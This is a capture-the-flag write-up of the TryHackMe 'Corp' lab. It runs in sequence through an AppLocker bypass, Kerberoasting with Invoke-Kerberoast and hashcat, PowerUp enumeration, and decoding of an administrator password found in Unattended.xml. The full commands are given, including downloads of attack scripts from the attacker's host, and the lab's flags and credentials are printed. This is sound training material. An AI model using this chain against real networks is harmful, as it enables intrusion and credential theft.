# THM: Corp

## Challenge Details

- **Platform:** TryHackMe
- **Challenge Type:** [[Privilege Escalation]], [[Active Directory]], [[Windows Basics]]
- **Difficulty:** Medium
- **Target IP/URL:** _[Insert Target IP if different from Kali's access]_
- **Status:** #solved
- **Date Solved:** [[2025-06-05]]

## 🎯 Objective

The primary objectives for this challenge were to bypass AppLocker, gain additional user credentials via Kerberoasting, and ultimately achieve Administrator access to retrieve all flags.

## 🛠️ Tools Used

- [[PowerShell Cheatsheet]]
- `setspn`
- [[Python]] (`http.server`)
- [[Hashcat]]
- [[xfreerdp3]]
- `Invoke-Kerberoast.ps1`
- `PowerUp.ps1`

---

## 🔍 Initial Access & AppLocker Bypass

We started the machine already logged in as the user **dark** with standard user permissions. The challenge provided a crucial hint regarding AppLocker bypass, specifically mentioning a whitelisted directory: `C:\Windows\System32\spool\drivers\color`.

### AppLocker Bypass Strategy

The provided information highlighted that placing an executable in `C:\Windows\System32\spool\drivers\color` would bypass default AppLocker rules, allowing us to execute arbitrary code.

Additionally, we learned about the `ConsoleHost_history.txt` file, which stores PowerShell command history, located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. This file would likely contain valuable historical data.

### Flag 1: PowerShell History

Following the instructions, we navigated to the specified PowerShell history file.

PowerShell

```
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Upon accessing the `ConsoleHost_history.txt` file, the first flag was obtained.

```
flag{a12a41b5f8111327690f836e9b302f0b}
```

---

## 💥 Privilege Escalation: Phase 1: Kerberoasting

With initial access and understanding of the AppLocker bypass, the next step was to enumerate the Windows environment for potential privilege escalation paths.

### Active Directory Enumeration with `setspn`

We were instructed to use `setspn` to enumerate Service Principal Names (SPNs) within the domain. Although the initial command failed to connect to "medin," it reverted to the current domain and revealed relevant information.

PowerShell

```
setspn -T medin -Q */*
```

The output indicated an existing SPN associated with the user **fela**:

```
CN=fela,CN=Users,DC=corp,DC=local
...
ServicePrincipalName : HTTP/fela
```

This discovery suggested a potential Kerberoasting opportunity.

### Downloading Invoke-Kerberoast

To exploit the Kerberoasting vulnerability, we needed the `Invoke-Kerberoast.ps1` script. We served this file from our Kali machine and downloaded it to the whitelisted AppLocker directory.

**On Kali (HTTP Server):**

Bash

```
python3 -m http.server 80
```

**On Target Machine (PowerShell: in `C:\Windows\System32\spool\drivers\color`):**

PowerShell

```
Invoke-WebRequest -Uri http://10.4.3.134:80/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
```

### Executing Invoke-Kerberoast and Extracting Hash

After downloading, we executed `Invoke-Kerberoast` to retrieve the SPN hash in a Hashcat-compatible format.

PowerShell

```
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

The command successfully extracted the Kerberos hash for the `HTTP/fela` SPN:

```
Hash : $krb5tgs$23$*fela$corp.local$HTTP/fela*$B7200E9256934F9C03D16F1EEDFE7465$B0E38817792356AB720A194...
SamAccountName : fela
DistinguishedName : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

### Cracking the Kerberos Hash

We copied the extracted hash to our Kali machine, removed spaces, and used Hashcat with the `rockyou.txt` wordlist to crack it.

**On Kali (Processing Hash):**

Bash

```
sed 's/ //g' hash > cleanhash.txt
```

**On Kali (Cracking Hash):**

Bash

```
hashcat -m 13100 -a 0 cleanhash.txt /usr/share/wordlists/rockyou.txt --force
```

The hash was successfully cracked, revealing the password:

```
rubenF124
```

### Accessing the System as Fela

With the credentials (`fela:rubenF124`), we used `xfreerdp3` to establish an RDP connection to the target machine.

Bash

```
xfreerdp3 +clipboard /v:10.10.135.136 /u:fela /p:rubenF124
```

### Flag 2: Fela's Desktop

Upon logging in as **fela**, we located and opened the second flag on the desktop.

```
flag{bde1642535aa396d2439d86fe54a36e4}
```

---

## 🪜 Privilege Escalation: Phase 2: Unattended Install

Now logged in as `fela`, we continued our search for a path to Administrator privileges.

### Enumerating with PowerUp.ps1

We used `PowerUp.ps1`, a powerful PowerShell script for Windows privilege escalation checks, to identify potential vulnerabilities. Similar to `Invoke-Kerberoast`, we downloaded it to the AppLocker whitelisted directory.

**On Target Machine (PowerShell: in `C:\Windows\System32\spool\drivers\color`):**

PowerShell

```
Invoke-WebRequest -Uri http://10.4.3.134:80/PowerUp.ps1 -OutFile PowerUp.ps1
```

After downloading, we executed `PowerUp.ps1` and ran `Invoke-AllChecks`.

PowerShell

```
. .\PowerUp.ps1
Invoke-AllChecks
```

The output indicated an **unattended install file** at `C:\Windows\Panther\Unattend\Unattended.xml`, which is a common source of credentials in CTFs.

### Extracting Administrator Credentials

We inspected the `Unattended.xml` file and found a base64 encoded password.

We then decoded the base64 string using PowerShell:

PowerShell

```
encoded = "[base64-encoded password]"
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(encoded)) | Write-Output
```

The decoded password was:

```
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW; $T
```

### Final Access as Administrator

With the Administrator password in hand, we logged in as the Administrator user, successfully gaining full control of the machine.

---

## 🚩 Final Flag

The final flag was found after gaining Administrator access:

```
THM{g00d_j0b_SYS4DM1n_M4s73R}
```

---

## 📚 Lessons Learned

- **AppLocker Bypass:** Understanding whitelisted directories (`C:\Windows\System32\spool\drivers\color`) is crucial for bypassing AppLocker in default configurations.
- **PowerShell History:** The `ConsoleHost_history.txt` file is a valuable source of information and potential flags on Windows systems.
- **Kerberoasting:** Knowing how to identify and exploit Kerberoastable accounts (`setspn` and `Invoke-Kerberoast`) is a key Active Directory attack vector.
- **Unattended Install Files:** `Unattended.xml` and similar files (`unattend.xml`, `sysprep.xml`, etc.) are frequent sources of cleartext or easily decryptable credentials during Windows privilege escalation.
- **Tool Usage:** Proficiency with tools like `PowerUp.ps1` for automated privilege escalation checks significantly speeds up the process.

---
